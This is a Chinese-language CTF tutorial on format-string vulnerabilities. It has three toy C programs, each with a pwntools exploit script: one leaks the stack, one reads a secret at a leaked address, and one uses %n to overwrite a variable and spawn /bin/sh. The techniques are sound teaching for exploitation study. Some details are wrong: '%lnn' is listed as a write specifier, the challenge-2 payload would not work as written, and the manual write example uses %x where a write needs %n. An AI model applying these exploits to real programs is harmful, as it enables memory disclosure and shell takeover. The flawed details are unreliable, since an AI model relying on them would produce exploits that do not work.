CTF-Pwn 格式化字符串实战

3道题目，学习格式化字符串漏洞的泄露和写入利用。

1

challenge1 - 泄露内存

入门

源码 (fmt1.c)

#include <stdio.h>
#include <stdlib.h>

int main() {
    char buf[100];
    
    printf("Enter your input: ");
    scanf("%99s", buf);
    
    printf(buf);  // 危险！直接打印用户输入
    
    return 0;
}
漏洞分析
  • 漏洞点：printf(buf) 而非 printf("%s", buf)
  • 利用方法：使用 %x 泄露栈上的数据
  • 泄露原理：%x 会把栈上下一个参数以16进制输出

编译命令

gcc -no-pie -fno-stack-protector -o fmt1 fmt1.c

Python 解题脚本

#!/usr/bin/env python3
from pwn import *

p = process('./fmt1')

# 发送格式化字符串，泄露栈上的数据
# %x 会把栈上后续内容以16进制打印出来
payload = b'%x %x %x %x %x %x %x %x'

print(f"Sending: {payload}")
p.sendline(payload)

# 接收输出
response = p.recv()
print("Response:")
print(response)

# 解析泄露的数据
# 如果泄露的内存中包含flag或关键地址，会显示出来
p.interactive()
脚本解释
  • %x - 泄露一个16进制数（栈上的值）
  • %s - 泄露指针指向的字符串
  • %p - 更详细的指针格式泄露
  • %N$x - 直接读取第N个参数，如 %7$x 读第7个
2

challenge2 - 泄露任意地址

进阶

源码 (fmt2.c)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char secret[] = "FLAG{test_flag_123}";  // 要泄露的内容

int main() {
    char buf[100];
    
    printf("Secret is at: %p\n", secret);  // 故意泄露地址
    printf("Enter your input: ");
    scanf("%99s", buf);
    printf(buf);
    printf("\n");
    
    return 0;
}
漏洞分析
  • 漏洞点：仍然是 printf(buf) 格式化字符串漏洞
  • 利用方法：利用 %s 配合已知地址泄露内容
  • 泄露原理：程序故意打印了 secret 的地址，我们用 %s 读取

编译命令

gcc -no-pie -fno-stack-protector -o fmt2 fmt2.c

Python 解题脚本

#!/usr/bin/env python3
from pwn import *

p = process('./fmt2')

# 第一步：获取secret地址
p.recvuntil("Secret is at: ")
secret_addr = int(p.recvline().strip(), 16)  # 解析地址
print(f"Secret address: {hex(secret_addr)}")

# 第二步：构造格式化字符串，泄露该地址的内容
# %s 会把指定地址的内容当作字符串输出
# %N$s 读取第N个参数指向的地址
# 我们需要把secret地址放在栈上适当位置

# 构造payload: 地址 + 格式化字符串
payload = p64(secret_addr) + b'%s'

p.sendline(payload)
flag = p.recvline()
print(f"Flag: {flag}")

p.interactive()
关键技巧
  • 程序泄露了地址 %p，我们就知道了 secret 在哪里
  • %s 会把栈上的值当作指针，读取它指向的字符串
  • 如果我们把地址放在栈顶，%s 就会读取那个地址的内容
3

challenge3 - 格式化字符串写

高阶

源码 (fmt3.c)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int win = 0;  // 目标：写入这个变量

int main() {
    char buf[100];
    
    printf("win is at: %p\n", &win);
    printf("Enter your input: ");
    scanf("%99s", buf);
    printf(buf);
    printf("\nwin = %d\n", win);
    
    if (win == 0xbeef) {  // 如果win被改成这个值就调用system
        system("/bin/sh");
    }
    
    return 0;
}
漏洞分析
  • 漏洞点：printf(buf) 格式化字符串漏洞
  • 利用方法：使用 %n 写入内存
  • 写入原理：%n 把已输出的字符数写入指定地址
  • 技巧：配合地址写入 + %N$x 指定参数位置

编译命令

gcc -no-pie -fno-stack-protector -o fmt3 fmt3.c

Python 解题脚本

#!/usr/bin/env python3
from pwn import *

p = process('./fmt3')

# 获取win变量地址
p.recvuntil("win is at: ")
win_addr = int(p.recvline().strip(), 16)
print(f"win address: {hex(win_addr)}")

# %n: 把已输出字符数写入栈上指定的地址
# 构造: [地址][填充到指定位置][%N$x]... 最后一个用 %N$n 写入

# 简化版：直接用 %N$n 写入
# 把win地址放在栈上第6个参数位置（需要调试确认）

# 方法1：使用 fmtstr_payload 自动生成
from pwn import fmtstr_payload

# 写入win地址，值为0xbeef
payload = fmtstr_payload(6, {win_addr: 0xbeef})

print(f"Payload length: {len(payload)}")
p.sendline(payload)
p.interactive()

# 方法2：手动构造
# 已知 win_addr = 0x......., 我们想让 %N$x 读到它
# payload = p64(win_addr) + b'%6$x'  # 如果win在第6个参数
%n 写入原理
  • %n - 写入4字节，把已输出字符总数写入目标地址
  • %hn - 写入2字节
  • %lnn - 写入8字节 (64位)
  • %N$x - 直接读/写第N个参数
  • fmtstr_payload(offset, writes) - pwntools自动生成格式化字符串exploit
